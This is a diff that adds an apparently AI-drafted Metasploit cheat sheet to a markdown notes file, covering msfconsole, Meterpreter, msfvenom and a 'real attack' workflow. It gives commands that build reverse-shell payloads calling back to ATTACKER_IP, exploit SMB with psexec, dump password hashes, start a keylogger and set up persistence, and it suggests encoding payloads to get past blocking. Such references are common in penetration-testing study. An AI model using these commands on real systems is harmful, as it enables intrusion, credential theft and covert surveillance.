@@ -428,12 +428,388 @@ Metasploit:
 
 ---
 
-If you want, I can also create:
+Below is the **All-in-One Metasploit + Meterpreter + msfvenom + Real-World Workflow Cheat Sheet** in **table format**, combining everything into a single professional pentester reference.
 
-- Metasploit Complete Cheat Sheet
-    
-- Meterpreter Command Cheat Sheet
-    
-- msfvenom Payload Creation Cheat Sheet
-    
-- Real-world Metasploit attack workflow guide
+---
+
+# ⚔️ METASPLOIT COMPLETE ALL-IN-ONE CHEAT SHEET
+
+---
+
+# 1️⃣ Metasploit Overview
+
+|Item|Description|
+|---|---|
+|Tool|Metasploit Framework|
+|Developer|Rapid7|
+|Purpose|Exploitation, payload delivery, post-exploitation|
+|Interface|msfconsole|
+|Payload count|500+|
+|Exploit count|2000+|
+|Platform support|Windows, Linux, macOS|
+
+Start Metasploit:
+
+```bash
+sudo msfconsole
+```
+
+---
+
+# 2️⃣ Metasploit Module Types
+
+|Module Type|Purpose|Example|
+|---|---|---|
+|exploit|Exploit vulnerability|exploit/windows/smb/psexec|
+|payload|Executes shell/code|windows/meterpreter/reverse_tcp|
+|auxiliary|Scanning/enumeration|auxiliary/scanner/smb/smb_version|
+|post|Post-exploitation|post/windows/gather/hashdump|
+|encoder|Encode payload|x86/shikata_ga_nai|
+|evasion|AV bypass|evasion/windows|
+
+---
+
+# 3️⃣ Metasploit Basic Commands
+
+|Command|Purpose|
+|---|---|
+|msfconsole|Start Metasploit|
+|help|Show commands|
+|search smb|Search modules|
+|use exploit/windows/smb/psexec|Select module|
+|options|Show options|
+|set OPTION VALUE|Set option|
+|exploit|Run exploit|
+|exit|Exit Metasploit|
+
+---
+
+# 4️⃣ Exploit Workflow
+
+|Step|Command|
+|---|---|
+|Start Metasploit|sudo msfconsole|
+|Search exploit|search smb|
+|Select exploit|use exploit/windows/smb/psexec|
+|View options|options|
+|Set target|set RHOSTS TARGET_IP|
+|Set attacker IP|set LHOST ATTACKER_IP|
+|Set credentials|set SMBUser USER|
+|Set password|set SMBPass PASS|
+|Run exploit|exploit|
+
+---
+
+# 5️⃣ Required Options Explained
+
+|Option|Meaning|
+|---|---|
+|RHOSTS|Target IP|
+|RPORT|Target port|
+|LHOST|Attacker IP|
+|LPORT|Listener port|
+|SMBUser|Username|
+|SMBPass|Password|
+|PAYLOAD|Payload type|
+
+---
+
+# 6️⃣ Payload Types
+
+|Payload|Description|
+|---|---|
+|windows/meterpreter/reverse_tcp|Windows reverse shell|
+|linux/x64/meterpreter/reverse_tcp|Linux reverse shell|
+|cmd/unix/reverse_bash|Bash reverse shell|
+|php/meterpreter_reverse_tcp|PHP reverse shell|
+
+---
+
+# 7️⃣ Meterpreter Overview
+
+Meterpreter is an advanced payload providing full control.
+
+|Feature|Function|
+|---|---|
+|In-memory execution|Stealth|
+|Command execution|Run commands|
+|File upload/download|Transfer files|
+|Keylogging|Capture keystrokes|
+|Privilege escalation|Gain admin|
+|Persistence|Maintain access|
+
+---
+
+# 8️⃣ Meterpreter Basic Commands
+
+|Command|Purpose|
+|---|---|
+|help|Show commands|
+|sysinfo|System info|
+|getuid|Current user|
+|pwd|Current directory|
+|ls|List files|
+|cd|Change directory|
+|shell|Get OS shell|
+|exit|Exit session|
+
+Example:
+
+```bash
+sysinfo
+```
+
+---
+
+# 9️⃣ Meterpreter File Commands
+
+|Command|Purpose|
+|---|---|
+|upload file|Upload file|
+|download file|Download file|
+|cat file|Read file|
+|rm file|Delete file|
+
+---
+
+# 🔟 Meterpreter Privilege Escalation
+
+|Command|Purpose|
+|---|---|
+|getsystem|Try privilege escalation|
+|hashdump|Dump password hashes|
+|ps|Show processes|
+|migrate PID|Migrate process|
+
+---
+
+# 1️⃣1️⃣ Meterpreter Networking Commands
+
+|Command|Purpose|
+|---|---|
+|ipconfig|Show network|
+|netstat|Show connections|
+|route|Show routes|
+
+---
+
+# 1️⃣2️⃣ msfvenom Payload Creation
+
+msfvenom creates custom payloads.
+
+---
+
+## Windows Payload
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell.exe
+```
+
+|Option|Meaning|
+|---|---|
+|-p|Payload|
+|LHOST|Attacker IP|
+|LPORT|Port|
+|-f exe|Output format|
+
+---
+
+## Linux Payload
+
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > shell.elf
+```
+
+---
+
+## PHP Payload
+
+```bash
+msfvenom -p php/meterpreter_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw > shell.php
+```
+
+---
+
+# 1️⃣3️⃣ Metasploit Multi Handler
+
+Used to catch payloads.
+
+```bash
+use exploit/multi/handler
+```
+
+```bash
+set payload windows/meterpreter/reverse_tcp
+```
+
+```bash
+set LHOST ATTACKER_IP
+```
+
+```bash
+set LPORT 4444
+```
+
+```bash
+exploit
+```
+
+---
+
+# 1️⃣4️⃣ Session Management
+
+|Command|Purpose|
+|---|---|
+|sessions|List sessions|
+|sessions -i 1|Interact|
+|sessions -k 1|Kill session|
+|background|Background session|
+
+---
+
+# 1️⃣5️⃣ Real-World Attack Workflow
+
+|Step|Tool|Action|
+|---|---|---|
+|1|Nmap|Scan target|
+|2|Metasploit|Search exploit|
+|3|Metasploit|Select exploit|
+|4|Metasploit|Set options|
+|5|Metasploit|Run exploit|
+|6|Meterpreter|Gain shell|
+|7|Meterpreter|Privilege escalation|
+|8|Meterpreter|Extract data|
+
+---
+
+# 1️⃣6️⃣ Example Real Attack
+
+Scan target:
+
+```bash
+nmap -sC -sV TARGET_IP
+```
+
+Start Metasploit:
+
+```bash
+msfconsole
+```
+
+Search exploit:
+
+```bash
+search smb
+```
+
+Use exploit:
+
+```bash
+use exploit/windows/smb/psexec
+```
+
+Set options:
+
+```bash
+set RHOSTS TARGET_IP
+set SMBUser USER
+set SMBPass PASS
+set LHOST ATTACKER_IP
+```
+
+Run exploit:
+
+```bash
+exploit
+```
+
+Get shell:
+
+```bash
+shell
+```
+
+---
+
+# 1️⃣7️⃣ Post-Exploitation Commands
+
+|Command|Purpose|
+|---|---|
+|sysinfo|System info|
+|getuid|Current user|
+|hashdump|Dump hashes|
+|screenshot|Capture screen|
+|keyscan_start|Start keylogger|
+|keyscan_dump|Show keys|
+
+---
+
+# 1️⃣8️⃣ Persistence
+
+|Command|Purpose|
+|---|---|
+|run persistence|Maintain access|
+
+---
+
+# 1️⃣9️⃣ Privilege Escalation Modules
+
+Search:
+
+```bash
+search suggester
+```
+
+Run:
+
+```bash
+use post/multi/recon/local_exploit_suggester
+```
+
+---
+
+# 2️⃣0️⃣ Important Payload Formats
+
+|Format|OS|
+|---|---|
+|.exe|Windows|
+|.elf|Linux|
+|.php|Web|
+|.ps1|PowerShell|
+
+---
+
+# 2️⃣1️⃣ Troubleshooting
+
+|Problem|Fix|
+|---|---|
+|No session|Check LHOST|
+|Exploit fails|Check credentials|
+|Payload blocked|Encode payload|
+|Wrong payload|Match OS|
+
+---
+
+# 2️⃣2️⃣ Most Important Commands (Quick Reference)
+
+|Task|Command|
+|---|---|
+|Start Metasploit|msfconsole|
+|Search exploit|search smb|
+|Use exploit|use exploit/windows/smb/psexec|
+|Set target|set RHOSTS IP|
+|Set payload|set payload windows/meterpreter/reverse_tcp|
+|Run exploit|exploit|
+|Show sessions|sessions|
+|Interact session|sessions -i 1|
+|Get shell|shell|
+
+---
+
+# 2️⃣3️⃣ Full Attack Chain Summary
+
+```text
+Recon → Scan → Exploit → Payload → Session → Privilege Escalation → Persistence → Data Extraction
+```
+
+---
